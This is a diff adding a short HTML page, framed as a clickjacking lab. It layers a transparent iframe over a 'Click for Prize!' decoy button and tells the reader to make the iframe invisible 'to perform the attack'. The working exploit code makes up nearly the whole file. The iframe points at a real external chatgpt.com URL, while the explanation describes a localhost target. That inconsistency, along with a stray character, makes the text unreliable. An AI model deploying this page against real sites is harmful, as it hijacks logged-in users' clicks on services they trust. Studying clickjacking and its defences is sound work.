@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking PoC Lab</title>
+    <style>
+        /* This container helps with positioning the elements */
+        #attack-container {
+            position: relative; /* This is the key to positioning children absolutely within it */
+            width: 500px;
+            height: 300px;
+            border: 2px dashed grey;
+            padding: 10px;
+            text-align: center;
+        }
+
+        /* The invisible iframe holding the vulnerable page */
+        #victim-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            
+            /* --- THE MAGIC --- */
+            /* Set opacity to 0.5 for alignment, then 0 for the final attack */
+            opacity: 0.5; 
+            z-index: 2; /* Ensures the iframe is ON TOP of the decoy button */
+        }
+
+        /* The decoy button that the user sees and intends to click */
+        #decoy-button {
+            position: absolute;
+            /* Adjust these top/left values to align with the target button */
+            top: 120px;
+            left: 150px; 
+            font-size: 24px;
+            padding: 20px;
+            z-index: 1; /* Ensures the decoy is BENEATH the iframe */
+        }
+    </style>
+</head>
+<body>
+    <h1>Clickjacking Attack Simulation</h1>
+    <p>The grey box below contains a decoy button and a semi-transparent iframe.</p>
+    <p>Your goal is to align the target button from the iframe (e.g., "Confirm Action") directly over the "Click for Prize!" button by adjusting the `top` and `left` values in the CSS for `#decoy-button`.</p>
+    <p>Once aligned, change the iframe's `opacity` to `0` to make it fully invisible and perform the attack.</p>
+
+    <div id="attack-container">
+        <!-- The user SEES this button -->
+        <button id="decoy-button">Click for Prize!</button>
+
+        <!-- The user unknowingly CLICKS the button inside this iframe -->
+        <iframe id="victim-iframe" src="https://chatgpt.com/share/68e7558a-9f48-8007-9e64-96de77ac468c"></iframe>
+    </div>
+
+    <h2>How it Works</h2>
+    <ol>
+        <li>The page loads the vulnerable URL (`/c/123123123`) in a transparent iframe.</li>
+        <li>Since you are logged into `localhost`, the iframe loads your authenticated session.</li>
+        <li>The iframe is placed on top of the decoy button.</li>
+        <li>When you click the decoy, you are actually clicking the button on the legitimate, but hidden, page.</li>
+        <li>This triggers the action on the vulnerable page, which is to navigate to `/?q=123123`.</li>å
+    </ol>
+
+</body>
+</html>
